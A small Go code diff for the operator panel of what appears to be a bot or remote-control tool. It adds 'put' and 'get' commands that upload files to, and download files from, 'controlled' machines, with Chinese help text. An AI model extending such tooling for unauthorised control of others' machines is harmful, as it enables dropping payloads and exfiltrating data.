@@ -44,6 +44,10 @@ func RunPanel(in io.Reader, out io.Writer, m *core.Manager, prog *logx.ProgramLo
 				continue
 			}
 			handleBot(out, sc, m, srv, args[1])
+		case "put":
+			handlePut(out, m, args[1:])
+		case "get":
+			handleGet(out, m, args[1:])
 		case "exit":
 			// 退出程序：不再监听端口，不再执行服务程序，直至下次启动
 			prog.Info("操作者执行 exit，程序退出")
@@ -83,6 +87,10 @@ func printHelp(out io.Writer) {
   bots -a           查看连接过的全部机器（读 botslog）
   bots -l           查看当前机器的详细信息
   bot [botID]       为该机器弹出独立终端窗口（可同时管理多台；窗口内 Ctrl+] 关闭）
+  put [botID] [本地文件] [可选远端目标路径]
+                     投放文件到被控端（不填路径落到其工作目录 received/ 下）
+  get [botID] [远端路径] [可选本地保存路径]
+                     从被控端下载文件（不填路径落到本机当前目录 received/ 下）
   exit              退出程序
 `)
 }
